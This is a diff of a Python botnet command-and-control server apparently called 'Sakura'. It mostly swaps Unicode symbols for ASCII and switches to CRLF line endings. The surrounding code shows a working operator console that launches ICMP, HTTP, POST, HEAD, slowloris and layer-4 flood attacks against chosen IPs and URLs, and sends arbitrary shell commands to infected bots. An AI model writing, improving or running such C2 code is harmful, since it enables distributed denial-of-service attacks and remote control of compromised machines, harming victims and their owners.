@@ -75,15 +75,15 @@ CAT_ART = (
     f"                  {PURP}%@{DPINK}@@@@@@@@@@@@@{PURP}@@@@@@@{RST}\n"
     f"                   {DPINK}#{PURP}@{DPINK}@@@@@{PURP}@%{PURP}@{DPINK}@@@@@{DPINK}#{RST}\n"
     f"                    {PURP}@@@@@@{PURP}% {PURP}%{PURP}@@@@@@{RST}\n"
-)
+).replace("\n", "\r\n")
 
 SAKURA_TEXT = (
-    f"{DRED}  ██████  █████  ██   ██ ██    ██ ██████   █████ {RST}\n"
-    f"{DRED} ██      ██   ██ ██  ██  ██    ██ ██   ██ ██   ██{RST}\n"
-    f"{RED}  █████  ███████ █████   ██    ██ ██████  ███████{RST}\n"
-    f"{DRED}      ██ ██   ██ ██  ██  ██    ██ ██   ██ ██   ██{RST}\n"
-    f"{DRED} ██████  ██   ██ ██   ██  ██████  ██   ██ ██   ██{RST}\n"
-)
+    f"{DRED}  ######  #####  ##   ## ##    ## ######   ##### {RST}\n"
+    f"{DRED} ##      ##   ## ##  ##  ##    ## ##   ## ##   ##{RST}\n"
+    f"{RED}  #####  ####### #####   ##    ## ######  #######{RST}\n"
+    f"{DRED}      ## ##   ## ##  ##  ##    ## ##   ## ##   ##{RST}\n"
+    f"{DRED} ######  ##   ## ##   ##  ######  ##   ## ##   ##{RST}\n"
+).replace("\n", "\r\n")
 
 
 # ─── XOR ENCRYPTION ───
@@ -177,10 +177,11 @@ def make_banner(bot_count, username, uptime_str, attack_count, running):
         f"  {GREY}User:{RST}       {PINK}{username}{RST}\n"
         f"  {GREY}Bots:{RST}       {WHITE}{bot_count}{RST}\n"
         f"  {GREY}Uptime:{RST}     {WHITE}{uptime_str}{RST}\n"
-        f"  {GREY}Attacks:{RST}    {WHITE}{attack_count}{RST}  {GREY}Running:{RST} {WHITE}{running}{RST}\n"
+        f"  {GREY}Attacks:{RST}    {WHITE}{attack_count}{RST}\n"
+        f"  {GREY}Running:{RST}    {WHITE}{running}{RST}\n"
         f"  {GREY}Encrypted:{RST}  {GREEN}Yes{RST} {GREY}(XOR){RST}\n\n"
         f"{sep}\n"
-    )
+    ).replace("\n", "\r\n")
 
 
 def make_title(bot_count, uptime_str, running):
@@ -526,7 +527,7 @@ class C2Server:
             f"{DRED}  │{RST}  {DIM}All sessions logged.{RST}                {DRED}│{RST}\r\n"
             f"{DRED}  └─────────────────────────────────────┘{RST}\r\n\r\n"
         )
-        self.send_to_admin(admin, f" {DRED}▸{RST} {WHITE}Username{RST} :: ")
+        self.send_to_admin(admin, f" {DRED}>{RST} {WHITE}Username{RST} :: ")
 
         try:
             username = read_line()
@@ -535,7 +536,7 @@ class C2Server:
             return
         admin.username = username.decode(errors='ignore').strip() or "admin"
 
-        self.send_to_admin(admin, f" {DRED}▸{RST} {WHITE}Password{RST} :: ")
+        self.send_to_admin(admin, f" {DRED}>{RST} {WHITE}Password{RST} :: ")
         try:
             pw = read_line()
         except Exception:
@@ -543,7 +544,7 @@ class C2Server:
             return
 
         if pw.decode(errors='ignore').strip() != ADMIN_PASS:
-            self.send_to_admin(admin, f"\r\n {RED}  ✗ Access denied.{RST}\r\n")
+            self.send_to_admin(admin, f"\r\n {RED}  [x] Access denied.{RST}\r\n")
             time.sleep(1)
             conn.close()
             return
@@ -561,7 +562,7 @@ class C2Server:
         )
         self.send_to_admin(admin, banner)
         self.send_to_admin(admin,
-            f"\r\n {GREEN}✓{RST} {LGREY}Welcome back,{RST} {PINK}{admin.username}{RST}\r\n"
+            f"\r\n {GREEN}[+]{RST} {LGREY}Welcome back,{RST} {PINK}{admin.username}{RST}\r\n"
             f" {GREY}Type {PINK}!help{GREY} for commands{RST}"
         )
         self.send_prompt(admin)
@@ -628,7 +629,7 @@ class C2Server:
                     for b in list(self.bots.values()):
                         self.send_to_bot(b, {"type": "ping"})
                 self.send_to_admin(admin,
-                    f"\r\n {GREEN}✓{RST} {GREY}Pinged{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
+                    f"\r\n {GREEN}[+]{RST} {GREY}Pinged{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
                 )
 
             elif op == "!kick":
@@ -646,7 +647,7 @@ class C2Server:
                     for b in list(self.bots.values()):
                         self.send_to_bot(b, {"type": "broadcast", "msg": msg})
                 self.send_to_admin(admin,
-                    f"\r\n {GREEN}✓{RST} {GREY}Broadcast to{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
+                    f"\r\n {GREEN}[+]{RST} {GREY}Broadcast to{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
                 )
 
             elif op == "!status":
@@ -686,7 +687,7 @@ class C2Server:
                     for a in self.attack_history:
                         a.active = False
                 self.send_to_admin(admin,
-                    f"\r\n {DRED}■{RST} {GREY}Stop sent to{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
+                    f"\r\n {DRED}[#]{RST} {GREY}Stop sent to{RST} {WHITE}{len(self.bots)}{RST} {GREY}bots{RST}"
                 )
                 self.broadcast_title()
 
@@ -697,7 +698,7 @@ class C2Server:
             elif op == "!icmp":
                 # icmp: !icmp <ip> <time> [threads]  (no port)
                 if len(parts) < 3:
-                    self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Usage:{RST} !icmp <ip> <time> [threads]")
+                    self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !icmp <ip> <time> [threads]")
                 else:
                     target = parts[1]
                     duration = min(int(parts[2]), MAX_ATTACK_TIME)
@@ -707,7 +708,7 @@ class C2Server:
             elif op in ("!http", "!post", "!head"):
                 method = {"!http": "http", "!post": "post", "!head": "head"}[op]
                 if len(parts) < 3:
-                    self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Usage:{RST} {op} <url> <time> [threads]")
+                    self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} {op} <url> <time> [threads]")
                 else:
                     url = parts[1]
                     duration = min(int(parts[2]), MAX_ATTACK_TIME)
@@ -716,7 +717,7 @@ class C2Server:
 
             elif op == "!slow":
                 if len(parts) < 4:
-                    self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Usage:{RST} !slow <ip> <port> <time>")
+                    self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !slow <ip> <port> <time>")
                 else:
                     target = parts[1]
                     port = int(parts[2])
@@ -725,12 +726,12 @@ class C2Server:
 
             else:
                 self.send_to_admin(admin,
-                    f"\r\n {RED}✗{RST} {GREY}Unknown command. Type{RST} {PINK}!help{RST}"
+                    f"\r\n {RED}[x]{RST} {GREY}Unknown command. Type{RST} {PINK}!help{RST}"
                 )
 
         except (ValueError, IndexError) as e:
             self.send_to_admin(admin,
-                f"\r\n {RED}✗{RST} {GREY}Bad arguments:{RST} {WHITE}{e}{RST}"
+                f"\r\n {RED}[x]{RST} {GREY}Bad arguments:{RST} {WHITE}{e}{RST}"
             )
 
         self.send_prompt(admin)
@@ -769,7 +770,7 @@ class C2Server:
 
     def _cmd_kick(self, admin, parts):
         if len(parts) < 2:
-            self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Usage:{RST} !kick <id|all>")
+            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !kick <id|all>")
             return
 
         target = parts[1].lower()
@@ -784,7 +785,7 @@ class C2Server:
                     except Exception:
                         pass
             self.send_to_admin(admin,
-                f"\r\n {DRED}■{RST} {GREY}Kicked{RST} {WHITE}{count}{RST} {GREY}bots{RST}"
+                f"\r\n {DRED}[#]{RST} {GREY}Kicked{RST} {WHITE}{count}{RST} {GREY}bots{RST}"
             )
         else:
             with self.lock:
@@ -796,16 +797,16 @@ class C2Server:
                     except Exception:
                         pass
                     self.send_to_admin(admin,
-                        f"\r\n {DRED}■{RST} {GREY}Kicked{RST} {WHITE}{target}{RST}"
+                        f"\r\n {DRED}[#]{RST} {GREY}Kicked{RST} {WHITE}{target}{RST}"
                     )
                 else:
                     self.send_to_admin(admin,
-                        f"\r\n {RED}✗{RST} {GREY}Not found:{RST} {WHITE}{target}{RST}"
+                        f"\r\n {RED}[x]{RST} {GREY}Not found:{RST} {WHITE}{target}{RST}"
                     )
 
     def _cmd_info(self, admin, parts):
         if len(parts) < 2:
-            self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Usage:{RST} !info <id>")
+            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !info <id>")
             return
 
         bid = parts[1]
@@ -813,7 +814,7 @@ class C2Server:
             b = self.bots.get(bid)
 
         if not b:
-            self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Not found:{RST} {WHITE}{bid}{RST}")
+            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Not found:{RST} {WHITE}{bid}{RST}")
             return
 
         up = fmt_duration(time.time() - b.connect_time)
@@ -836,7 +837,7 @@ class C2Server:
 
     def _cmd_shell(self, admin, parts):
         if len(parts) < 3:
-            self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Usage:{RST} !shell <id> <command>")
+            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !shell <id> <command>")
             return
 
         bid = parts[1]
@@ -846,12 +847,12 @@ class C2Server:
             b = self.bots.get(bid)
 
         if not b:
-            self.send_to_admin(admin, f"\r\n {RED}✗{RST} {GREY}Not found:{RST} {WHITE}{bid}{RST}")
+            self.send_to_admin(admin, f"\r\n {RED}[x]{RST} {GREY}Not found:{RST} {WHITE}{bid}{RST}")
             return
 
         self.send_to_bot(b, {"type": "shell", "cmd": shell_cmd})
         self.send_to_admin(admin,
-            f"\r\n {CYAN}▸{RST} {GREY}Sent to{RST} {WHITE}{bid}{RST}{GREY}:{RST} {DIM}{shell_cmd}{RST}"
+            f"\r\n {CYAN}>{RST} {GREY}Sent to{RST} {WHITE}{bid}{RST}{GREY}:{RST} {DIM}{shell_cmd}{RST}"
         )
 
     def _cmd_status(self, admin):
@@ -883,11 +884,11 @@ class C2Server:
             pct = min(100, (elapsed / a.duration) * 100) if a.duration else 100
             bar_len = 20
             filled = int(bar_len * pct / 100)
-            bar = f"{RED}{'█' * filled}{GREY}{'░' * (bar_len - filled)}{RST}"
+            bar = f"{RED}{'#' * filled}{GREY}{'-' * (bar_len - filled)}{RST}"
             self.send_to_admin(admin,
-                f"\r\n  {PINK}{a.method.upper()}{RST} {GREY}→{RST} {WHITE}{a.target}:{a.port}{RST}"
+                f"\r\n  {PINK}{a.method.upper()}{RST} {GREY}->{RST} {WHITE}{a.target}:{a.port}{RST}"
                 f"  [{bar}] {WHITE}{pct:.0f}%{RST}  {GREY}{fmt_duration(remaining)} left{RST}"
-                f"  {GREY}×{a.threads}t ×{a.bots_sent}b{RST}"
+                f"  {GREY}x{a.threads}t x{a.bots_sent}b{RST}"
             )
 
     def _cmd_history(self, admin):
@@ -919,7 +920,7 @@ class C2Server:
     def _cmd_l4_attack(self, admin, parts, method):
         if len(parts) < 4:
             self.send_to_admin(admin,
-                f"\r\n {RED}✗{RST} {GREY}Usage:{RST} !{method} <ip> <port> <time> [threads]"
+                f"\r\n {RED}[x]{RST} {GREY}Usage:{RST} !{method} <ip> <port> <time> [threads]"
             )
             return
         target = parts[1]
@@ -949,12 +950,12 @@ class C2Server:
 
         if sent == 0:
             self.send_to_admin(admin,
-                f"\r\n {RED}✗{RST} {GREY}No bots available.{RST}"
+                f"\r\n {RED}[x]{RST} {GREY}No bots available.{RST}"
             )
             return
 
         self.broadcast_admin(
-            f"\r\n {RED}⚡{RST} {WHITE}Attack launched{RST}"
+            f"\r\n {RED}[!]{RST} {WHITE}Attack launched{RST}"
             f"\r\n    {GREY}Method:{RST}    {PINK}{method.upper()}{RST}"
             f"\r\n    {GREY}Target:{RST}    {WHITE}{target}:{port}{RST}"
             f"\r\n    {GREY}Duration:{RST}  {WHITE}{duration}s{RST}"
@@ -967,8 +968,8 @@ class C2Server:
             time.sleep(duration)
             record.active = False
             self.broadcast_admin(
-                f"\r\n {GREY}[■]{RST} {LGREY}Attack finished:{RST} "
-                f"{PINK}{method.upper()}{RST} {GREY}→{RST} {WHITE}{target}{RST}"
+                f"\r\n {GREY}[#]{RST} {LGREY}Attack finished:{RST} "
+                f"{PINK}{method.upper()}{RST} {GREY}->{RST} {WHITE}{target}{RST}"
             )
             self.broadcast_prompt()
             self.broadcast_title()
